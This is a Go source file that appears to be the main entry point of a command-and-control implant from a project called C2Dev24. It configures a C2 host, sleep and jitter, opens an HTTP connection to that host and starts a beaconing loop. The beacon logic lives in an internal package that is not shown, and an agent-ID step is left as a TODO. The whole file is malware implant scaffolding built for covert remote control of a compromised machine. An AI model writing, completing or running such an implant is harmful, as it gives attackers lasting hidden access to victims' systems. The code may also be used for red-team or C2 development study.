package main

import (
	"github.com/coremedic/C2Dev24/payload/internal"
	"log"
	"sync"
)

var (
	C2Host string = ""
	Sleep  int    = 10
	Jitter int    = 5
	err    error
)

// Instance
//
// Singleton for our payload instance
type Instance struct {
	C2Host   string
	Sleep    int
	Jitter   int
	HttpConn *internal.HttpConn
	Beacon   *internal.Beacon
}

var (
	once          sync.Once
	localInstance *Instance
)

// GetLocalInstance
//
// Fetch local singleton instance
func GetLocalInstance() *Instance {
	once.Do(func() {
		localInstance = &Instance{
			C2Host: C2Host,
			Sleep:  Sleep,
			Jitter: Jitter,
		}
	})
	return localInstance
}

func main() {
	// Fetch local singleton instance
	instance := GetLocalInstance()

	// Create our HttpConn instance
	instance.HttpConn, err = internal.NewHttpConn(instance.C2Host)
	if err != nil {
		log.Fatal(err)
	}

	// Create our Beacon instance
	instance.Beacon = internal.NewBeacon()

	// Configure Beacon instance
	instance.Beacon.Sleep = instance.Sleep
	instance.Beacon.Jitter = instance.Jitter
	instance.Beacon.HttpConn = instance.HttpConn
	instance.Beacon.ReqQueue = &internal.RequestQueue

	// TODO: Fetch agent Id

	// Start the beacon
	instance.Beacon.Start()
}
